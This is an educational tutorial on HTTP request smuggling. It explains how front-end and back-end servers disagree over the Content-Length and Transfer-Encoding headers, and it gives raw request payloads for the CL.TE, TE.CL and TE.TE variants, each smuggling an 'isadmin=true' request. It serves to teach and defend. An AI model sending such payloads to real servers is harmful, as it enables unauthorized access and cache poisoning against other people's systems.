#### Importance of Understanding HTTP Request Smuggling
1. Smuggled requests might evade security mechanisms like Web Application Firewalls. This potentially leads to unauthorized access or data leaks.
2. Attackers can poison web caches by smuggling malicious content, causing users to see incorrect or harmful data.
3. Smuggled requests can be chained to exploit other vulnerabilities in the system, amplifying the potential damage.
4. Due to the intricate nature of this vulnerability, it can often go undetected, making it crucial for security professionals to understand and mitigate it.
### Understanding HTTP Request Structure
1. **Request Line**: The first line of the request `POST /admin/login HTTP/1.1` is the request line. It consists of at least three items. First is the method, which in this case is "POST". The method is a one-word command that tells the server what to do with the resource. Second is the path component of the URL for the request. The path identifies the resource on the server, which in this case is "/admin/login". Lastly, the HTTP version number shows the HTTP specification to which the client has tried to make the message comply. Note that HTTP/2 and HTTP/1.1 have different structures.
2. **Request Headers**: This section contains metadata about the request, such as the type of content being sent, the desired response format, and authentication tokens. It's like the envelope of a letter, providing information about the sender, receiver, and the nature of the content inside.
3. **Message Body**: This is the actual content of the request. The body might be empty for a GET request, but for a POST request, it could contain form data, JSON payloads, or file uploads.
#### Content-Length Header
The Content-Length header indicates the request or response body size in bytes.
#### Transfer-Encoding Header
This header is used to specify the form of encoding applied to the message body of an HTTP request or response. A commonly used value for this header is "chunked", indicating that the message body is divided into a series of chunks, each preceded by its size in hexadecimal format. Other possible values for the Transfer-Encoding header include "compress", "deflate", and "gzip", each indicating a different type of encoding.

### HTTP Request Smuggling Origin
HTTP Request Smuggling primarily occurs due to discrepancies in how different servers (like a front-end server and a back-end server) interpret HTTP request boundaries. For example:
1. If both Content-Length and Transfer-Encoding headers are present, ambiguities arise.
2. Some components prioritize Content-Length, while other prioritize Transfer-Encoding.
3. This discrepancy can lead to one component believing the request has ended while another thinks it's still ongoing, leading to smuggling.

## CL.TE
**CL.TE** stands for **Content-Length/Transfer-Encoding**. The name **CL.TE** comes from the two headers involved: **Content-Length** and **Transfer-Encoding**. In CL.TE technique, the attacker exploits discrepancies between how different servers (typically a front-end and a back-end server) prioritize these headers. For example:

- The proxy uses the Content-Length header to determine the end of a request.
- The back-end server uses the Transfer-Encoding header.
Because of this discrepancy, it's possible to craft ambiguous requests that are interpreted differently by each server.
#### Exploiting CL.TE for Request Smuggling
```
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```
Here, the front-end server sees the `Content-Length` of 130 bytes and believes the request ends after  `isadmin=true`. However, the back-end server sees the `Transfer-Encoding: chunked` and interprets the `0` as the end of a chunk, making the second request the start of a new chunk. This can lead to the back-end server treating the `POST /update HTTP/1.1` as a separate, new request, potentially giving the attacker unauthorized access.

## TE.CL
**TE.CL** stands for **Transfer-Encoding/Content-Length**. This technique is the opposite of the CL.TE method. In the TE.CL approach, the discrepancy in header interpretation is flipped because the front-end server uses the Transfer-Encoding header to determine the end of a request, and the back-end server uses the Content-Length header.
#### Exploiting TE.CL for Request Smuggling
```
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```
In the above payload, the front-end server sees the `Transfer-Encoding: chunked` header and processes the request as chunked. The `78` (hexadecimal for 120) indicates that the next 120 bytes are part of the current request's body. The front-end server considers everything up to the `0` (indicating the end of the chunked message) as part of the body of the first request.
The back-end server, however, uses the Content-Length header, which is set to 4. It processes only the first 4 bytes of the request, not including the entire smuggled request `POST /update`. The remaining part of the request, starting from **POST /update**, is then interpreted by the back-end server as a separate, new request.

## Transfer Encoding Obfuscation
**Transfer Encoding Obfuscation,** also known as **TE.TE** stands for **Transfer-Encoding/Transfer-Encoding**. The technique arises when both the front-end and the back-end servers use the Transfer-Encoding header. In TE.TE technique, the attacker takes advantage of the servers' inconsistent handling of  Transfer-Encoding present in the HTTP headers.
The TE.TE vulnerability doesn't always require multiple Transfer-Encoding headers. Instead, it often involves a single, malformed Transfer-Encoding header that is interpreted differently by the front-end and back-end servers. In some cases, the front-end server might ignore or strip out the malformed part of the header and process the request normally, while the back-end server might interpret the request differently due to the malformed header, leading to request smuggling.
#### Exploiting TE.TE for Request Smuggling
```
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```
